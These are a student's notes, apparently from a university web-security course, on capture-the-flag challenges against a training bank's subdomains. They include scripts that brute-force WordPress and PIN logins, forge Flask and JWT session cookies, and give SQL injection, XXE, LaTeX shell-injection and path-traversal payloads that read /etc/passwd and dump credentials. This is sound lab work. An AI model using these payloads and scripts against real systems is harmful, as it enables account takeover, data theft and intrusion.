# Flags

## Week 0

1. welcome subdomain
2. welcome subdomain
3. account subdomain - inspect element: edit no to yes, set checked="true" on checkbox
4. cookies subdomain - edit the value of the cookie lucky from 0 to 1
5. card subdomain - intercept form submission with Burp Suite, change fee value, forward

## Week 1

Task: find as many subdomains as you can by using reconnaissance

1. crt.sh to find super-secret.admin subdomain

2. m.staging subdomain

3. vault42.sandbox subdomain

4. careers page from www subdomain sitemap (or bruteforce)

5. subdomainnfinder.c99.nl to find test subdomain

6. wow-how-did-i-find-this-super-secret-backup subdomain

7. mobile subdomain

8. m subdomain

9. banking subdomain

10. dev subdomain

11. Page source of www subdomain to find www-prepod subdomain, or pentest-tools or script

12. pentest-tools or script to find adserver subdomain

13. HTTP as a service challenge 1, access kb.quoccabank.com via haas.quoccabank.com with

    ```http
    GET / HTTP/1.1
    Host: kb.quoccabank.com
    ```

    returns

    ```http
    HTTP/1.1 200 OK
    Accept-Ranges: bytes
    Content-Length: 249
    Content-Type: text/html; charset=utf-8
    Date: Fri, 11 Jun 2021 01:37:57 GMT
    Server: CTFProxy/2aea9b0
    X-Ctfproxy-Trace-Context: a4692045-e690-4bd0-a745-95dccb53e3c8
    Connection: close
    
    <a href="/c98efc0d-5c3f-45ec-996a-2cb82d35ed26.html">follow this link to get easy flag (manual work)</a>
    <a href="/deep/">follow this link to get harder flag (automatic work)</a>
    <a href="/calculator/">follow this link to visit human calculator</a>
    ```

    Changing request to:

    ```http
    GET /c98efc0d-5c3f-45ec-996a-2cb82d35ed26.html HTTP/1.1
    Host: kb.quoccabank.com
    ```

    returns

    ```http
    HTTP/1.1 200 OK
    Accept-Ranges: bytes
    Content-Length: 99
    Content-Type: text/html; charset=utf-8
    Date: Fri, 11 Jun 2021 01:39:00 GMT
    Server: CTFProxy/2aea9b0
    X-Ctfproxy-Trace-Context: 3d66a696-1403-4c3b-b724-825b251e6bab
    Connection: close
    
    <a href="/7643dc3d-2262-4f1c-8fb9-197860946a66.html">7643dc3d-2262-4f1c-8fb9-197860946a66.html</a>
    ```

    Do something similar with the new link to obtain flag

14. HTTP as a service challenge 2 (deep), accessing with

    ```http
    GET /deep/ HTTP/1.1
    Host: kb.quoccabank.com
    ```

    returns

    ```http
    HTTP/1.1 200 OK
    Accept-Ranges: bytes
    Content-Length: 787
    Content-Type: text/html; charset=utf-8
    Date: Sat, 12 Jun 2021 11:37:56 GMT
    Server: CTFProxy/2aea9b0
    X-Ctfproxy-Trace-Context: 0b197c0d-5d50-4f3b-ab20-f2467f6bb19f
    
    kwqaduor<a href="./opnvlqckyaubifmp.html">mgykdpwbg</a>blaymmmfbzmrnujy<a href="./oeyarrefx.html">wyzfm</a>xdzpryqiosk<a href="./xkeqdjazwjvtbobszre.html">vqdvdufaj</a>goynmcllr<a href="./oyboldbqcpt.html">smt</a>zyjyamfsnmge<a href="./iepehreaqehpsrnjzb.html">yphwgtwdh</a>vihuvpvefgoah<a href="./effbdctwzpn.html">tygzi</a>msdtrkxvpzwgs<a href="./wolkdbnjakwvzot.html">rtfmvbkp</a>ngtadacutpg<a href="./kyvdwvthwq.html">mykzmti</a>mfoaxog<a href="./kbhppvjemarq.html">yrcrncyqi</a>kgoulmjdey<a href="./gpoqy.html">xdr</a>vjigvsreope<a href="./wdbjqlzqw.html">qqyinjbc</a>mbisppgqxjnyy<a href="./gqtntyzilmvd.html">dbpknno</a>sfqsqqvv<a href="./xxkilksedch.html">jayehrgif</a>mphvduqypasoh<a href="./ijbcptcicsgtqqv.html">ybnn</a>xpuptwwnsicnb<a href="./pvzgbhteg.html">xmrppg</a>ubhjpn
    ```

    where each link returns something similar. I used Python to make a request to each subpage through haas recursively:

    ```python
    ''' Make recursive requests to kb.quoccabank.com via haas.quoccabank.com '''
    seen = set()
    def solve(sub='', throttle=0):
        # keep track of seen substitutions
        if sub in seen:
            return
        seen.add(sub)
        # make request
        payload = {
            'request': f'GET /deep/{sub} HTTP/1.1\nHost: kb.quoccabank.com'
        }
        resp = requests.post('https://haas.quoccabank.com/', cert=(cert_path, key_path), data=payload)
        time.sleep(throttle)
        if resp.status_code == 420:
            # make the same request again
            seen.remove(sub)
            solve(sub, throttle + 0.1)
        else: 
            print(resp.text)
            # find and recursively request other links
            links = [x[2:] for x in re.findall(r'<a href="(.*?)"', resp.text)]
            for link in links:
                solve(link, throttle)
    
    if __name__ == '__main__':
        # python deep.py | grep COMP6443
        solve()
    ```
    
15. HTTP as a service challenge 3 (calculator) - get request with

    ```http
    GET /calculator/ HTTP/1.1
    Host: kb.quoccabank.com
    ```

    returns something like

    ```http
    HTTP/1.1 200 OK
    Content-Length: 264
    Content-Type: text/html
    Date: Sat, 12 Jun 2021 11:41:06 GMT
    Server: CTFProxy/2aea9b0
    Set-Cookie: calc=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJQcm9ncmVzcyI6MCwiTGFzdEFuc3dlciI6MTMyLCJTdGFydFRpbWUiOjE2MjM0OTgwNjZ9.YR2zkik4MCP63ie2OXleKTugHwyjZ-TUqI8x5dL0dWU; HttpOnly
    X-Ctfproxy-Trace-Context: 4353b0b8-28ab-4b70-9f63-db56514d23c1
    
    <h1>welcome to calculator</h1>You are the calculator! If you answer 20 questions correctly in 2 minutes, you can proceed<br>You have currently answered 0 questions.<br>What is 50+82?<form method="POST"><input name="answer" type="text"/><input type="submit"></form>
    ```

    We need to make POST requests with answer= the solved mathematical question, and carrying the cookie returned each time. I used the following Python script:

    ```python
    ''' Make recursive requests to kb.quoccabank.com via haas.quoccabank.com '''
    def solve(prev_answer=0, prev_cookie='', throttle=0):
        # make request
        answer = 'answer=' + str(prev_answer)
        data = {'request': '''POST /calculator/ HTTP/1.1
    Host: kb.quoccabank.com''' + ('\n' + prev_cookie if prev_cookie else '') + f'''
    Content-Type: application/x-www-form-urlencoded
    Content-Length: {len(answer)}
    
    {answer}
    '''}
        resp = requests.post('https://haas.quoccabank.com/', cert=(cert_path, key_path), data=data)
        time.sleep(throttle)
        if resp.status_code == 420:
            # make the same request again
            solve(prev_answer, prev_cookie, throttle + 0.1)
        else: 
            print(resp.text)
            try:
                # extract cookie and compute equation
                cookie = re.findall(r'Set-(Cookie: calc=.*?);', resp.text)[0]
                eqn = re.findall(r'What is (.*?)\?', resp.text)[0]
                solve(eval(eqn), cookie, throttle)
            except IndexError:
                pass
    
    if __name__ == '__main__':
        # python calculator.py | grep COMP6443
        solve()
    ```
    
16. Subdomain bruteforce script - creditcard

17. www-dev

18. Amass to find www-staging subdomain

19. www-cdn

20. 



<u>Notes:</u>

- Find subdomains using cert.sh, pentest-tools.com, subdomainnfinder.c99.nl, Amass or script:

  ```python
  def solve(subdomain, throttle=0):
      # make request
      print(f'\n\nSubdomain: {subdomain}')
      try:
          resp = requests.get(f'https://{subdomain}.quoccabank.com/', cert=(cert_path, key_path))
          print(resp.text)
          if 'COMP6443{' in resp.text:
              sys.stderr.write(f'Found: {subdomain}\n')
              sys.stderr.write(resp.text)
              sys.stderr.write('\n')
      except Exception as e:
          print(f'Not found: {e}')
      print('\n======================')
  
  if __name__ == '__main__':
      # python subdomain.py > subdomains.txt
      with open('subdomain_big.txt') as f:
          wordlist = set(f.read().lower().split())
      for word in wordlist:
          solve(word)
  ```
  
- Burp Suite - install extension Copy As Python - Requests --> right click intercepted request and select copy to Python

- 



## Week 2

blog subdomain

1. meta tag flag attribute in root blog page source code, obtaining COMP6443{ivefinallyfoundsomeone}

2. Noticing blog post pages had urls of the form 'blog.quoccabank.com/?p=x', manually trying x=2 redirected to 'blog.quoccabank.com?page_id=2', which contained a flag. I then wrote a Python script to extract 2 more flags (3 in total using this method).

   ```python
   # make requests to blog, bruteforcing page ids
   for i in range(10000):
     resp = requests.get(f'https://blog.quoccabank.com/?page_id={i}', cert=(cert_path, key_path))
     matches = re.findall(r'COMP6443{.*?}', resp.text)
     matches.remove('COMP6443{ivefinallyfoundsomeone}')
     if matches:
       print(matches)
   ```

   Obtained COMP6443{hiddenpostflag} from page 2, COMP6443{strongpasswordsaregreat} from page 45 and COMP6443{restructuringisonthecards} from page 53
   Can also search for "comp" to get all three flags

3. Each page with author has a body class of archive author author-{username} author-{userID} hfeed no-sidebar (full name in page title) 1 is admin, 2 is sarah, 3 is mq (Madame Quoc), 4 is timothy, 5 is administrator -> bruteforce Wordpress admin login page blog.quoccabank.com/wp-login.php for username mq with 10-million-password-list-top-10000.txt. Password: 1q2w3e. Users -> two remaining flags - COMP6443{Ifoundsarah}

   ```python
   ''' Make requests to blog Wordpress admin '''
   def solve(throttle=0):
       # make request
       with open(os.path.expanduser('~/Downloads/10-million-password-list-top-10000.txt'), 'r', encoding='latin1') as f:
           pwds = f.read().split()
       for pwd in pwds:
           burp0_url = "https://blog.quoccabank.com:443/wp-login.php"
           burp0_cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
           burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://blog.quoccabank.com/wp-login.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://blog.quoccabank.com", "Upgrade-Insecure-Requests": "1", "Te": "trailers", "Connection": "close"}
           burp0_data = {"log": "mq", "pwd": pwd, "wp-submit": "Log In", "redirect_to": "https://blog.quoccabank.com/wp-admin/", "testcookie": "1"}
           resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, cert=lientcert)
           print((pwd, len(resp.text)))
           if len(resp.text) != 8052:
               return
   
   if __name__ == '__main__':
       solve()
   ```

4. COMP6443{Ialsofoundtimmy}

sales subdomain

1. Burp suite indicated that a cookie with key metadata and value YWRtaW49MA%3D%3D was being sent on form submission, which didn't change with varying inputs. Upon searching what the HTML encoding for %3D was, I found that it represented the '=' character, which seemed like a base64 encoded string. Substituting and decoding, this refered to the string 'admin=0'. Simply updating the cookie to the base64 encoded version of 'admin=1', encoded appropriately, allowed me to gain access to the sales page and obtain the flag. 

files subdomain

1. Documents are of the form: files.quoccabank.com/document/{file_name}?r={base64encodedUser} - try filename=flag and r=base64encoded "admin" -> COMP6443{1D0R_1S_A_TH1NG.ejUzMTczMzc=.BpABuZPysYYVcCDRacwbUg==} TODO: I should probably remove /admin

2. Go to /admin and brute force 4 digit access code - 1024 - COMP6443{I_DONT_LIKE_JAVASCRIPT.ejUzMTczMzc=.ZLsjDUcL97Db1nOZP2WV4Q==}

   ```python
   ''' Make requests to files '''
   def solve(throttle=0):
       # make request
       from itertools import product
       f = list(product([str(x) for x in range(10)], repeat=4))
       for a,b,c,d in f:
           burp0_url = "https://files.quoccabank.com:443/admin"
           burp0_cookies = {"session": "eyJyb2xlIjoiVXNlciIsInVzZXJuYW1lIjoidGVzdCJ9.YMv2DQ.cHkNHtfSFW094ht3K1p82J9IbKo"}
           burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://files.quoccabank.com", "Referer": "https://files.quoccabank.com/admin", "Upgrade-Insecure-Requests": "1", "Te": "trailers", "Connection": "close"}
           burp0_data = {"pin": a+b+c+d}
           resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, cert=lientcert)
           print((a+b+c+d, len(resp.text)))
           if len(resp.text) != 198:
               return
   
   if __name__ == '__main__':
       solve()
   ```

3. Inspect JavaScript for login page (beautify) -> 

   ````javascript
   {
     path: "/staff/wfh",
     name: "wfh",
     component: L
   }
   ````

   Going to https://files.quoccabank.com/#/staff/wfh tells you to use https://files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username={username} to give staff access to an account. Now that account has a new file "staff_super_secret_file" containing the flag COMP6443{DO_U_LIKE_JAVASCRIPT.ejUzMTczMzc=.7ok7sJmJHpi8hKg+RClAbQ==}.

4. Doing this also creates the file "staff_flask_secret_key" of $hallICompareTHEE2aSummersday. The following script can be used to obtain a valid session cookie to access any account on the website

   ```python
   # Reference: https://ctftime.org/writeup/11812
   import hashlib
   from itsdangerous import URLSafeTimedSerializer
   from flask.sessions import TaggedJSONSerializer
   
   KEY = '$hallICompareTHEE2aSummersday'
   
   def decode_flask_cookie(secret_key, cookie_str):
       salt = 'cookie-session'
       serializer = TaggedJSONSerializer()
       signer_kwargs = {
           'key_derivation': 'hmac',
           'digest_method': hashlib.sha1
       }
       s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
       return s.loads(cookie_str)
   
   
   def encode_flask_cookie(secret_key, cookie):
       salt = 'cookie-session'
       serializer = TaggedJSONSerializer()
       signer_kwargs = {
           'key_derivation': 'hmac',
           'digest_method': hashlib.sha1
       }
       s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
       return s.dumps(cookie)
   
   
   if __name__ == '__main__':
       cookie = 'eyJyb2xlIjp7IiBiIjoiVTNSaFptWT0ifSwidXNlcm5hbWUiOiJ0ZXN0In0.YM3-0Q.Wr7mv0JrqapDElKfzFs2Vp7caHM'
       cookie_val = (decode_flask_cookie(KEY, cookie))
       print(cookie_val)
       new_cookie = dict(cookie_val)
       new_cookie['username'] = 'Admin'
       new_cookie['role'] = b'Admin'
       print(encode_flask_cookie(KEY, new_cookie)) 
   ```

   There is a new file with the flag COMP6443{WHAT_IS_FLAAAASK.ejUzMTczMzc=.ISojDDXPXIpn4yodwC2g7w==} as its file name.

Extra findings:

- XSS vulnerable content
- /me contains json for all files
- Intercepted new notes go to ./upload - can upload to another user's account?
- File name affects url - can log in as another user (like first flag) using query stacking (only takes first in this case)

notes subdomain

1. Noticed refreshing after a while, "cookie expired" appeared -> check cookie with CookieManager. Tried manually changing expiration of notes_auth cookie, which didn't do anything. Noticed value of cookie was a JWT -> edited payload by overriding the expiry field to a bigger timestamp, and username from my zID@quoccabank.com to admin@quoccabank.com. Update the original cookie to the new JWT token to obtain the flag (server did not verify signature of jwt).



# Week 4-5

pay-portal subdomain

- `" OR 1=1-- `
- COMP6443{SQLilsPowerful}

support subdomain

- Noticed new notes had the format of /raw/{base58encode(customer_id:ticket_id)}
  - Python brute force: flag found at 1125:4
  - Another flag found at 9447:1

bigapp subdomain

Objectives:

- Login
  - `' or 1=1;-- ` for username with any valid password
  - Flag can be found in response header for login.html upon successful login
- Make the banking product list return more than it should
  - Injecting `') OR 1=1) UNION SELECT 1, table_name, 3, column_name, 5, 6 FROM information_schema.columns-- )` allowed me to access additional rows
  - Inspecting the network and examining the API called, the flag appears in the response header if more than 20 (expected) rows are returned
- Sort the banking products
  - ORDER BY ID ASC
  - Inject: `') OR 1=1) ORDER BY id ASC-- )`
  - Note: union select * from bproducts doesn't give flag :(
- Find alternate means to login other than the obvious (no SQLi required)
  - 
- Become admin without logging into admin
  - Cookie (edit base_encoded email:user to email:admin)
- Login to admin using its actual password without online brute-forcing
  - Inject: `') OR 1=1) UNION SELECT 1, email, 3, password, 4, 5 FROM users-- )` to get all credentials
  - Password hashed - rainbow table (MD5): admin@quoccabank.com with Admin@123
  - Flag obtained - similar method to Login (1)
- Create duplicate user with existing user's email
  - Intercept registration of existing user's email - replace payload with url-encoded `Chris.Hall@lazy.com' OR 1=1-- )` - flag can be found in response header





- Analyse network: https://bigapp.quoccabank.com/api/v1/bproducts?q={query}
- Non-url encoded q=' or '1' = '1'-- : returns the syntax in error message
  - OR pname LIKE '%' or '1' = '1'--%') AND bu IS NOT NULL)
  - So MySQL query is something like SELECT id, pname, code, category, bu, owner FROM bproducts WHERE .. OR pname LIKE '%{}%') AND bu IS NOT NULL)
  - We want something like: OR pname LIKE '%') OR 1=1
  - `')) OR 1=1-- )` last bracket makes sure trailing space gets registered

signin subdomain

- Reset -> enter email to get password (can only use zID@quoccabank.com which you own - even though you can change your email to admin@quoccabank.com through Burp Suite)

- Login -> displays IP details (also makes a request to qdns subdomain)

- Navigate to qdns subdomain -> override by registering IP address (from signin) with another domain (TXT record is vulnerable to SQLi)

- Injecting a magic payload into the TXT record, an error is produced when sending a password reset request through the form (before the generated password is issued)

- Probing with a record of `' or 1=1-- )` returns an error "expected 1 arguments, got 4". Further probing with an invalid payload of `' foo --)` reveals the rest of the original query, which expect three more arguments. Examining the behaviour of qdns settings and txt record updates only having an effect when a new reset request is sent, I was able to guess and construct the SQL query used to process the request and update the password: 

  ```sql
  UPDATE users password=?, reset_details=?, last_reset=?, reset_actor=? where email=?;
  ```

- Since the invalid payload revealed that I was injecting into the reset_details parameter, I was able to inject the payload `', last_reset=?, reset_actor=? where email=? or email='admin@quoccabank.com' -- )` to reset my account as well as the admin account to have the same password, and logging into the admin account displays the flag.

- Note: resetting the admin may not always be ideal, so it might be better to just retrieve the admin password instead

  - `', last_reset=concat(?, (select password from users where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` doesn't work since MySQL doesn't let you access the table being updated
  - `', last_reset=concat(?, (select password from (select * from users) as temp where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` displays the admin password which can be logged into

v1.feedifier subdomain

- Source code: flag hidden in /flag_1e023d780b687b2b3be9b3a5b65a4a23
- Navigating to this returns error 404 - most likely file to be accessed on server
- GitHub Gist to host malicious xml file - modify existing RSS template such as https://blog.quoccabank.com/?feed=rss2
  - Add `<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///flag_1e023d780b687b2b3be9b3a5b65a4a23">]>`
  - Overwrite one of the link fields for a RSS item with `&xxe;` - other fields have output length limited
  - The link will now be the flag

v2.feedifier subdomain

- Using the same method for the new flag location (from source code) returns an error: bad word detected

- From experimenting, this bad word is `file://`

- Can't concatenate XML entities or use `&#47;` instead of a `/`, or use different encodings -> potentially load another XXE entity

- Main xml:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % load SYSTEM "external dtd (different from current domain)"> %load;]>
  <rss version="2.0">
  <channel>
    <item>
    	<title>&payload;</title>
      <link>&payload;</link>
    	<description>&payload;</description>
    </item>
  </channel>
  </rss>
  ```

- External dtd:

  ```xml-dtd
  <!ENTITY payload SYSTEM "file:///flag_ef06b68429bb6010ab389ebbe34cb757">
  ```

v3.feedifier subdomain

- Bypass multiple layers of regex filtering

- Same main xml

- External dtd:

  ```xml-dtd
  <!ENTITY % p1 "file">
  <!ENTITY % p2 ":///fl">
  <!ENTITY % p3 "ag_986133c07ed52690d698ab47a2fd1aef">
  <!ENTITY % pload "<!ENTITY payload SYSTEM '%p1;%p2;%p3;'>">
  %pload;
  ```

  https://youtu.be/gjm6VHZa_8s

  https://github.com/Angus-C-git/SecSheets/blob/master/Web/Injection/XXE/XXE.md

v4.feedifier subdomain



letters subdomain

- Flag 1
  - LaTex to PDF /flag file in source code
  - inject LaTeX: `\input{/flag}` to open /flag file to get flag
- Flag 2
  - /key file in source code: similar approach as above to get the key: imagineUsingW0rd
  - key signs the debug option
  - Payload: `\input{|"ls / | base64"}`
  - then `\input{|"cat /admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf | base64"}`
  - then reading the base64 decoded bytes as a pdf to get the flag  [Hacking with LaTeX](https://0day.work/hacking-with-latex/)

bfd subdomain

- https://github.com/ajyoon/systemf/blob/master/examples/http/server.bf#L241 mentions treating the address as a relative file path
- Intercept GET request with Burp Suite, make request to `/../../../../etc/passwd` or `//etc/passwd` to get the flag COMP6443{BRAAAAAINS}

gcc subdomain

- Checks uploaded file ends with .c
- Copies it to /tmp/php?????.c: `cp/mv filename /tmp/php?????.c`
- Runs gcc to compile it: `gcc /tmp/php?????.c`
- Binary name strips .c
- Binary uploaded with UNIXTIMESTAMP_binaryname



Compiler errors are displayed - `#include "/etc/passwd"` and  `#include "/var/www/html/index.php"` - first line displayed

However, `#include "/var/www/html/flag.php"` displays error that file/directory does not exist

GET request to /upload.php - undefined index: fileToUpload in /quocca-gcc/upload.php





#include any uploaded file

Ideas:

- Code that is both valid PHP and C -> filename something.php.c -> download link is a .php endpoint which can be executed





All Python Scripts which use Requests to connect to *.quoccabank.com have the following header

```python
import os
import re
import sys
import time
import requests
from OpenSSL import crypto

''' Adapted from Brendan Nyholm '''
# .p12 certificate
p12_path = os.path.expanduser(r'~/Downloads/6443.p12')
p12_password = '' # TODO
# create pem file from p12
p12 = crypto.load_pkcs12(open(p12_path, 'rb').read(), p12_password.encode())
# PEM formatted private key
key_path = os.path.expanduser(r'~/myKey.key')
k = crypto.dump_privatekey(crypto.FILETYPE_PEM, p12.get_privatekey())
with open(key_path, 'wb') as f_key:
    f_key.write(k)
# PEM formatted certificate
cert_path = os.path.expanduser(r'~/myCert.crt')
c = crypto.dump_certificate(crypto.FILETYPE_PEM, p12.get_certificate())
with open(cert_path, 'wb') as f_cert:
    f_cert.write(c)
lientcert = (cert_path, key_path)
```

















